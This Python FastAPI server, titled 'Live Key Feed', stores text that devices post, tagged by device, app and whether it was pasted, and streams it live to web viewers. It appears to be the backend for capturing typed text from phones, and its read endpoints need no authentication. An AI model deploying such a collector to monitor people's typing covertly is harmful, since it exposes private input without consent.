import asyncio
import json
import os
import time
from collections import deque
from pathlib import Path
from typing import Deque, Dict

from fastapi import FastAPI, Header, Request
from fastapi.responses import FileResponse, JSONResponse, StreamingResponse
from pydantic import BaseModel
import psycopg

MAX_MESSAGES = 200
BASE_DIR = Path(__file__).resolve().parent
LOG_PATH = BASE_DIR / "text.txt"
HTML_PATH = BASE_DIR / "index.html"
PHONES_HTML_PATH = BASE_DIR / "phones" / "index.html"
messages: Deque[Dict[str, object]] = deque(maxlen=MAX_MESSAGES)
devices: Dict[str, Dict[str, object]] = {}
DATABASE_URL = os.getenv("DATABASE_URL", "").strip()


def load_file_messages():
    try:
        with LOG_PATH.open("r", encoding="utf-8") as f:
            lines = [line.strip() for line in f.read().splitlines() if line.strip()]
    except FileNotFoundError:
        return []

    parsed = []
    for line in lines:
        if "|" not in line:
            continue
        parts = line.split("|", 4)
        try:
            if len(parts) == 2:
                ts, text = parts
                device_id = "unknown"
                device_name = "Unknown device"
                is_pasted = False
            elif len(parts) == 5:
                ts, device_id, device_name, pasted_value, text = parts
                is_pasted = pasted_value == "1"
            else:
                ts, device_id, device_name, text = parts
                is_pasted = False
            parsed.append(
                {
                    "id": int(ts),
                    "text": text.strip(),
                    "time": int(ts),
                    "device_id": device_id,
                    "device_name": device_name,
                    "app_name": "Unknown app",
                    "is_pasted": is_pasted,
                }
            )
        except ValueError:
            continue
    return parsed


def load_text_messages():
    global messages
    parsed = []
    if DATABASE_URL:
        try:
            with psycopg.connect(DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute(
                        """
                        SELECT id, text, device_id, device_name, app_name, time, is_pasted
                        FROM messages
                        ORDER BY time DESC
                        LIMIT %s
                        """,
                        (MAX_MESSAGES,),
                    )
                    rows = cursor.fetchall()
            parsed = [
                {
                    "id": row[0],
                    "text": row[1],
                    "device_id": row[2],
                    "device_name": row[3],
                    "app_name": row[4],
                    "time": row[5],
                    "is_pasted": row[6],
                }
                for row in reversed(rows)
            ]
        except Exception as error:
            print(f"Could not load Supabase messages: {error}")

    if not parsed:
        parsed = load_file_messages()
    messages = deque(parsed[-MAX_MESSAGES:], maxlen=MAX_MESSAGES)
    for item in messages:
        devices[str(item["device_id"])] = {
            "id": item["device_id"],
            "name": item["device_name"],
            "last_seen": item["time"],
        }


def save_message(item):
    if not DATABASE_URL:
        write_text_log()
        return

    with psycopg.connect(DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute(
                """
                INSERT INTO messages (id, text, device_id, device_name, app_name, time, is_pasted)
                VALUES (%s, %s, %s, %s, %s, %s, %s)
                """,
                (
                    item["id"],
                    item["text"],
                    item["device_id"],
                    item["device_name"],
                    item["app_name"],
                    item["time"],
                    item["is_pasted"],
                ),
            )


def write_text_log():
    line_text = "\n".join(
        f"{int(item['time'])}|{item['device_id']}|{item['device_name']}|{1 if item.get('is_pasted') else 0}|{item['text']}"
        for item in list(messages)
    )
    with LOG_PATH.open("w", encoding="utf-8") as f:
        f.write(line_text)


class MessageInput(BaseModel):
    text: str
    device_id: str = "unknown"
    device_name: str = "Unknown device"
    app_name: str = "Unknown app"
    is_pasted: bool = False


app = FastAPI(title="Live Key Feed")
load_text_messages()


@app.get("/")
async def root():
    return FileResponse(HTML_PATH)


@app.get("/phones")
async def phones():
    return FileResponse(PHONES_HTML_PATH)


@app.get("/messages")
async def fetch_messages():
    return JSONResponse(list(messages))


@app.get("/api/devices")
async def fetch_devices():
    return JSONResponse(list(devices.values()))


@app.post("/api/messages")
async def add_message(payload: MessageInput, x_api_key: str | None = Header(default=None)):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)

    text = payload.text.strip()
    if not text:
        return JSONResponse({"ok": False, "error": "empty message"})

    now = int(time.time() * 1000)
    device_id = payload.device_id.strip() or "unknown"
    device_name = payload.device_name.strip() or "Unknown device"
    app_name = payload.app_name.strip() or "Unknown app"
    is_pasted = payload.is_pasted
    devices[device_id] = {
        "id": device_id,
        "name": device_name,
        "last_seen": now,
    }
    item = {
        "id": now,
        "text": text,
        "time": now,
        "device_id": device_id,
        "device_name": device_name,
        "app_name": app_name,
        "is_pasted": is_pasted,
    }
    try:
        save_message(item)
    except Exception as error:
        print(f"Could not save message: {error}")
        return JSONResponse(
            {"ok": False, "error": "message storage unavailable"}, status_code=503
        )
    messages.append(item)
    return JSONResponse({"ok": True, "message": item})


@app.get("/events")
async def events(request: Request):
    async def event_generator():
        last_seen = max((int(item["id"]) for item in messages), default=0)
        while True:
            for msg in list(messages):
                msg_id = int(msg["id"])
                if msg_id > last_seen:
                    yield f"data: {json.dumps(msg)}\n\n"
                    last_seen = msg_id
            if await request.is_disconnected():
                break
            await asyncio.sleep(0.5)

    return StreamingResponse(event_generator(), media_type="text/event-stream")


@app.get("/health")
async def health():
    return {"ok": True, "count": len(messages)}


if __name__ == "__main__":
    import uvicorn

    port = int(os.getenv("PORT", "8000"))
    uvicorn.run("app:app", host="0.0.0.0", port=port, reload=False)
